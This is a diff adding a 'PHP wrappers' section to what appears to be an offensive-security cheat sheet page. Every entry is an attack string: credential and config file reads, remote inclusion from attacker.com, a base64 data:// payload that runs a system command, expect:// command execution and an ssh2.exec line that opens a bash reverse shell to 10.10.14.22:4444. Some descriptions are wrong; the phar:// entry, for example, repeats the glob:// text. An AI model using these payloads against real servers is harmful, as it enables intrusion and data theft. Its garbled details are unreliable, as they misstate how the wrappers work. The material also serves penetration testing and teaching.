@@ -27,7 +27,84 @@
             <ul>
                 <p> Credentials may be located in the following files</p>
                 <pre><code class="language-bash">.env</code></pre>
-            </ul>    
+            </ul>
+            
+            <h2>PHP wrappers</h2>
+            <ul>
+                <p>In PHP, a wrapper is an abstraction layer that allows you to access different types of resources (files, streams, sockets, etc.) using the same set of standard PHP functions, such as fopen(), file_get_contents(), fwrite(), and so on.</p>
+                <p>There are several types of wrappers</p>
+                <h3>file://</h3>
+                    <ul>
+                       <p>Accessing local filesystem - via LFI or SSRF</p>
+                       <pre><code class="language-php">file:///etc/passwd
+file:///var/www/html/config.php</code></pre> 
+                    </ul>
+                <h3>http://</h3>
+                    <ul>
+                       <p>Accessing HTTP(s) URLs - Load malicious payload from remote server (you own)</p>
+                       <pre><code class="language-php">http://attacker.com/shell.txt
+http://127.0.0.1:8080/admin</code></pre> 
+                    </ul>    
+                <h3>ftp://</h3>
+                    <ul>
+                       <p>Accessing FTP(s) URLs - Retrieve file via FTP anonymously or not</p> 
+                    <pre><code class="language-php">ftp://anonymous:anonymous@attacker.com/malicious.php
+ftp://user:pass@attacker.com/evil.txt</code></pre>
+                    </ul>
+                <h3>php://</h3>
+                <ul>
+                   <p>I/O streams (LFI → RCE) - Reveal source code </p>
+                   <pre><code class="language-php">php://filter/convert.base64-encode/resource=index.php</code></pre>
+                   <p>Or to inject php code - Send PHP payload in POST body</p>
+                   <pre><code class="language-php">php://input</code></pre>
+                </ul>
+
+                <h3>zlib://</h3>
+                    <ul>
+                       <p>Compression Streams - Compressed file inclusion</p> 
+                       <pre><code class="language-php">zlib://var/www/html/shell.php.gz</code></pre>
+                    </ul>
+
+                <h3>data://</h3>
+                    <ul>
+                       <p>Inline payloads - RCE if allow_url_include=On</p>
+                       <pre><code class="language-php">data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code></pre> 
+                    </ul>
+                <h3>glob://</h3>
+                    <ul>
+                       <p>Find pathnames matching pattern - List files with a pattern</p>
+                       <pre><code class="language-php">glob:///var/www/html/*.php</code></pre> 
+                       
+                    </ul>
+                <h3>phar://</h3>
+                    <ul>
+                       <p>Find pathnames matching pattern</p>
+                       <p>An attacker may use it to upload files to the server with changed extensions then using phar:// we can execute the uploaded file</p>
+                       <pre><code class="language-php">phar:///var/www/html/uploads/evil.phar</code></pre>  
+                    </ul>
+                
+                <h3>ssh2://</h3>
+                    <ul>
+                        <p>Secure Shell 2 - Remote shell execution via SSH (Remember to URL code the command part)</p>
+                        <pre><code class="language-php">ssh2.exec://username:password@127.0.0.1/bash -c "bash -i >& /dev/tcp/10.10.14.22/4444 0>&1"</code></pre>  
+                    </ul>
+                <h3>rar://</h3>
+                    <ul>
+                        <p>Access files inside RAR file</p>
+                        <pre><code class="language-php">rar:///var/www/html/backups/config.rar#config.php</code></pre>  
+                    </ul>
+                <h3>ogg://</h3>
+                    <ul>
+                        <p>Audio streams - Abuse for arbitrary file reading if audio file path controlled:</p>
+                        <p> An .ogg file is a multimedia container format, most commonly used for audio, but can also contain video, text, and metadata</p>
+                        <pre><code class="language-php">ogg:///var/www/html/secret.ogg</code></pre>
+                    </ul>
+                <h3>expect://</h3>
+                    <ul>
+                        <p>Process Interaction Streams - Direct command ejecution</p>
+                        <pre><code class="language-php">expect://id</code></pre>  
+                    </ul>                
+            </ul>   
         </div>
     </div>
 
